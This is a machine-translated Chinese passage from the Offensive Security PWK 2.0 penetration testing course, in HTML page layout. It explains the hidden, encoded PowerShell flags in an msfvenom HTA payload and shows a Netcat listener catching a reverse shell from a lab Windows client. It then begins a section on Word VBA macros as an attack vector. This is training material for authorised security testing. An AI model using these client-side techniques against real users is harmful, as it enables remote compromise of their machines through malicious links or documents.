<div style="position:absolute;top:124344;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:124364;left:270"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 390 - msfvenom 生成的 HTA 文件的内容摘录</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:124393;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在清单390的突出显示的行，请注意PowerShell是由所执行</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的方法</font></font></nobr></div>
<div style="position:absolute;top:124412;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows Scripting Host 以及三个命令行参数。</font></font></nobr></div>
<div style="position:absolute;top:124445;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第一个参数，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-nop</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，是简写</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-NoProfile</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">347</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它指示PowerShell的不负载</font></font></nobr></div>
<div style="position:absolute;top:124465;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerShell 用户配置文件。</font></font></nobr></div>
<div style="position:absolute;top:124497;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当 PowerShell 启动时，默认情况下，它会加载任何现有用户的配置文件脚本，这可能</font></font></nobr></div>
<div style="position:absolute;top:124517;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对我们代码的执行产生负面影响。</font><font style="vertical-align: inherit;">此选项将避免该潜在问题。</font></font></nobr></div>
<div style="position:absolute;top:124550;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，我们的脚本使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-w hidden</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-WindowStyle</font></font></font></b><font style="vertical-align: inherit;"><font style="font-size:8px"><font style="vertical-align: inherit;"> 348 的</font></font><font style="vertical-align: inherit;">简写</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:124550;left:607"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">hidden </font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">) 以避免创建一个</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:124569;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户桌面上的窗口。</font></font></nobr></div>
<div style="position:absolute;top:124602;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最后，极其重要的</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-e</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志（</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-EncodedCommand 的</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">简写</font><font style="vertical-align: inherit;">）允许我们提供一个</font></font></nobr></div>
<div style="position:absolute;top:124622;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Base64 编码的</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">349</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> PowerShell 脚本直接作为命令行参数。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:124719;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">347 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2019 年），https://docs.microsoft.com/en-us/powershell/scripting/core-powershell/console/powershell.exe-command-line-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:124734;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帮助？view=powershell-6</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:124753;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">348 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2019 年），https://docs.microsoft.com/en-us/powershell/scripting/core-powershell/console/powershell.exe-command-line-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:124768;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帮助？view=powershell-5.1</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:124787;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">349 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2018 年），https://en.wikipedia.org/wiki/Base64</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:124915;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="106"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 106 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:124948;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:126025;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:126025;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:126025;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">426</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:125044;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将在 Kali 机器上托管这个新的 HTA 应用程序并启动一个 Netcat 监听器来测试我们的</font></font></nobr></div>
<div style="position:absolute;top:125063;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">攻击。</font><font style="vertical-align: inherit;">然后我们将通过浏览到恶意 URL 并接受这两个来模拟我们的受害者</font></font></nobr></div>
<div style="position:absolute;top:125082;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">安全警告。</font><font style="vertical-align: inherit;">如果一切按计划进行，我们应该能够捕获一个反向shell：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:125117;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nc -lnvp 4444</font></font></font></b></nobr></div>
<div style="position:absolute;top:125134;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听[任何] 4444 ...</font></font></nobr></div>
<div style="position:absolute;top:125151;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从（未知）[10.11.0.22] 50260 连接到 [10.11.0.4]</font></font></nobr></div>
<div style="position:absolute;top:125168;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Windows [版本 10.0.17134.590]</font></font></nobr></div>
<div style="position:absolute;top:125185;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(c) 2018 年微软公司。</font><font style="vertical-align: inherit;">版权所有。</font></font></nobr></div>
<div style="position:absolute;top:125219;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\Offsec&gt;</font></font></nobr></div>
<div style="position:absolute;top:125238;left:318"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 391 - 来自 HTA 攻击的主动反向 shell</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:125268;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这种攻击媒介允许我们通过 Internet Explorer 破坏 Windows 客户端，而无需</font></font></nobr></div>
<div style="position:absolute;top:125287;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">存在特定的软件漏洞。</font><font style="vertical-align: inherit;">由于指向 HTML 应用程序的链接可以是</font></font></nobr></div>
<div style="position:absolute;top:125307;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过电子邮件发送，我们甚至可以破坏 NAT 的内部客户端。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:125341;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">13.2.2.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:125371;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 使用 msfvenom 生成 HTML 应用程序并使用它来破坏您的 Windows</font></font></nobr></div>
<div style="position:absolute;top:125390;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">客户。</font></font></nobr></div>
<div style="position:absolute;top:125419;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 是否可以对Microsoft Edge 用户使用HTML Application 攻击，如果可以，</font></font></nobr></div>
<div style="position:absolute;top:125438;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如何？</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:125475;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">13.3 利用 Microsoft Office</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:125517;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在利用客户端漏洞时，重要的是使用受信任的应用程序</font></font></nobr></div>
<div style="position:absolute;top:125536;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">日常工作中的受害者。</font><font style="vertical-align: inherit;">与可能看起来可疑的 Web 链接不同，Microsoft</font></font></nobr></div>
<div style="position:absolute;top:125556;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Office </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">350</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">客户端攻击往往成功，因为很难区分恶意</font></font></nobr></div>
<div style="position:absolute;top:125575;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内容来自良性。</font><font style="vertical-align: inherit;">在本节中，我们将探索利用各种客户端攻击媒介</font></font></nobr></div>
<div style="position:absolute;top:125594;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">微软办公应用程序。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:125629;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">13.3.1</font></font></i></nobr></div>
<div style="position:absolute;top:125629;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">安装 Microsoft Office</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:125667;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在我们开始滥用 Microsoft Office 之前，我们必须将其安装在 Windows 10 学生 VM 上。</font></font></nobr></div>
<div style="position:absolute;top:125699;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们通过在文件资源管理器中导航到 C:\tools\client_side_attacks\Office2016.img 并双击</font></font></nobr></div>
<div style="position:absolute;top:125719;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">单击它。</font><font style="vertical-align: inherit;">这会将文件作为虚拟 CD 加载，并允许我们从 Setup.exe 开始安装</font></font></nobr></div>
<div style="position:absolute;top:125738;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如图 246 所示。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:125975;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">350 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2019 年），https://www.office.com/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:126103;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="107"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 107 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:126136;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:127213;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:127213;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:127213;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">427</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:126426;left:339"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 246：Microsoft Office 2016 安装程序</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:126457;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">安装完成后，我们</font><font style="vertical-align: inherit;">在闪屏上</font><font style="vertical-align: inherit;">按</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">关闭</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">退出安装程序并打开</font></font></nobr></div>
<div style="position:absolute;top:126476;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开始菜单中的 Microsoft Word。</font><font style="vertical-align: inherit;">Microsoft Word 打开后，将弹出如图 247 所示的弹出窗口</font></font></nobr></div>
<div style="position:absolute;top:126495;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">会出现。</font><font style="vertical-align: inherit;">我们可以通过单击右上角突出显示的十字来关闭它以启动 7-</font></font></nobr></div>
<div style="position:absolute;top:126515;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">日审。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:126982;left:372"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 247：产品密钥弹出窗口</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:127013;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为最后一步，显示许可协议弹出窗口，必须按</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接受接受</font></font></i></nobr></div>
<div style="position:absolute;top:127033;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并启动 Word</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，如图 248 所示。</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:127291;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="108"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 108 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:127324;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:128401;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:128401;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:128401;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">428</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:127854;left:351"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 248：接受许可协议</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:127885;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">安装和配置 Microsoft Office，尤其是 Microsoft Word 后，我们可以开始挖掘</font></font></nobr></div>
<div style="position:absolute;top:127904;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">了解它如何被滥用于客户端代码执行。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:127939;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">13.3.2</font></font></i></nobr></div>
<div style="position:absolute;top:127939;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">微软 Word 宏</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:127977;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Word</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">宏</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可能是最古老和最著名的客户端软件攻击之一</font></font></nobr></div>
<div style="position:absolute;top:127996;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">向量。</font></font></nobr></div>
<div style="position:absolute;top:128029;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Office 应用程序（如 Word 和 Excel）允许用户嵌入</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">宏</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、一系列</font></font></nobr></div>
<div style="position:absolute;top:128048;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">组合在一起以通过编程方式完成任务的命令和指令。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">351</font></font></font></nobr></div>
<div style="position:absolute;top:128067;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">组织经常使用宏来管理动态内容并将文档与外部链接</font></font></nobr></div>
<div style="position:absolute;top:128087;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内容。</font><font style="vertical-align: inherit;">更有趣的是，可以在 Visual Basic for Applications 中从头开始编写宏</font></font></nobr></div>
<div style="position:absolute;top:128106;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(VBA), </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">352</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它是一种功能齐全的脚本语言，可以完全访问 ActiveX 对象和</font></font></nobr></div>
<div style="position:absolute;top:128126;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows Script Host，类似于 HTML 应用程序中的 JavaScript。</font></font></nobr></div>
<div style="position:absolute;top:128158;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">创建 Microsoft Word 宏就像选择</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">VIEW</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">功能区并选择</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Macros</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一样简单</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:128178;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如图 249 所示，我们只需为宏键入一个名称，然后</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">下拉菜单</font><font style="vertical-align: inherit;">中的</font><i><font style="vertical-align: inherit;">宏中</font></i><font style="vertical-align: inherit;">，选择</font></font></nobr></div>
<div style="position:absolute;top:128197;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">宏将插入到的文档的名称。</font><font style="vertical-align: inherit;">当我们点击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Create 时</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，一个简单的宏</font></font></nobr></div>
<div style="position:absolute;top:128216;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">框架将被插入到我们的文档中。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:128331;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">351 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2019 年），https://support.office.com/en-us/article/Create-or-run-a-macro-C6B99036-905C-49A6-818A-DFB98B7C3C9C</font></font></font></nobr></div>
<div style="position:absolute;top:128351;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">352 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（教程点，2019 年），https://www.tutorialspoint.com/vba/vba_overview.htm</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:128479;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="109"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 109 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:128512;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:129589;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:129589;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:129589;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">429</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:129026;left:330"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 249：创建 Microsoft Word 宏</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:129057;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们检查我们的简单宏（如清单 392 所示）并讨论 VBA 的基础知识。</font><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:129077;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在我们的 VBA 宏中使用的主要过程以关键字</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sub </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">353</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开始</font><font style="vertical-align: inherit;">并以</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">End Sub 结束</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:129096;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这基本上标志着我们的宏的主体。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:129158;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sub 过程与 VBA 中的函数非常相似。</font><font style="vertical-align: inherit;">不同之处在于</font></font></i></nobr></div>
<div style="position:absolute;top:129177;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sub 过程不能在表达式中使用的事实，因为它们不</font></font></i></nobr></div>
<div style="position:absolute;top:129196;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回任何值，而函数可以。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:129259;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这一点上，我们的新宏</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MyMacro()</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">只是一个空程序和几行开头</font></font></nobr></div>
<div style="position:absolute;top:129278;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">带有撇号，它标志着 VBA 中注释的开始。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:129313;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">子我的宏()</font></font></nobr></div>
<div style="position:absolute;top:129330;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'</font></font></nobr></div>
<div style="position:absolute;top:129347;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">' MyMacro 宏</font></font></nobr></div>
<div style="position:absolute;top:129364;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'</font></font></nobr></div>
<div style="position:absolute;top:129381;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'</font></font></nobr></div>
<div style="position:absolute;top:129415;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结束子</font></font></nobr></div>
<div style="position:absolute;top:129434;left:362"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 392 - 默认的空宏</font></font></i></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:129525;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">353 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2017 年），https://docs.microsoft.com/en-us/office/vba/Language/Concepts/Getting-Started/calling-sub-and-function-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:129540;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">程序 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:129667;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="110"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 110 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:129700;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:130777;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:130777;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:130777;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">430</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:129796;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要像之前一样通过 ActiveX 调用 Windows 脚本宿主，我们可以使用</font></font></nobr></div>
